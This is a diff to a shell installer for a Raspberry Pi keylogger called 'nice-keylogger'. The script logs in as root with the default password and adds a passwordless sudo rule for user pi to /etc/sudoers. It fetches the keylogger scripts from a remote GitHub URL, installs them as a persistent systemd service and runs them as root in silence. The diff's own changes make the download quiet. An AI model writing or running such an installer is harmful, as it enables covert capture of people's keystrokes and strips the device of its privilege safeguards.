@@ -4,7 +4,7 @@
 # entry point:
 base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 
-# CHECK THAT USER CAN ISSUE SUDO
+# Force user to be included in sudoers and remove the need for passwords
 # Totally expects the root user to be an unchanged Raspberry Pi
 su - root <<!
 raspberry
@@ -13,6 +13,7 @@ echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 !
 
 mkdir nicekl && cd nicekl/
+pwd
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
@@ -20,14 +21,13 @@ CONT=${base}controller.py
 KMAP=${base}keymap.py
 FKEY=${base}find_keyboard.py
 KLSERV=${base}nicekeylogger.service
-wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
+wget -q -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
 sudo chmod +x controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
 sudo mv nicekeylogger.service /etc/systemd/system/
 sudo systemctl enable nicekeylogger.service
 sudo systemctl daemon-reload
-
 
 # RUN APPLICATION
 sudo python3 controller.py > /dev/null 2>&1 &
